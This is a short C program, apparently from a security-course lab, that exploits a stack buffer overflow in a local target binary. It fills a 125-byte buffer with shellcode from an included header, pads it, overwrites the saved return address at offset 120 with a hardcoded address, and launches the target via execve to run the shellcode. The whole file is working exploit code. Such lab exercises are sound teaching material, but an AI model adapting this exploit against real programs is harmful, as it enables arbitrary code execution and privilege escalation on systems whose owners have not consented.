
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target1"
#define BUFFER_SIZE 125

int main (int argc, char* argv[]) {
        char* args[3];
        char* env[1];
        char exploit[BUFFER_SIZE];
        int i = 0;

        strcpy(exploit, shellcode);
        for (i = 45; i < BUFFER_SIZE; i++) {
                exploit[i] = 0x01;
        }

        int return_add = 0x2021fe10;
        int* ret_in_exploit = (int*) (exploit + 120);
        *ret_in_exploit = return_add;
        exploit[124] = '\0';

        args[0] = TARGET;
        args[1] = exploit;
        args[2] = NULL;
        env[0] = NULL;

        if (execve(TARGET, args, env) < 0)
                fprintf(stderr, "execve failed.\n");

        return 0;
}
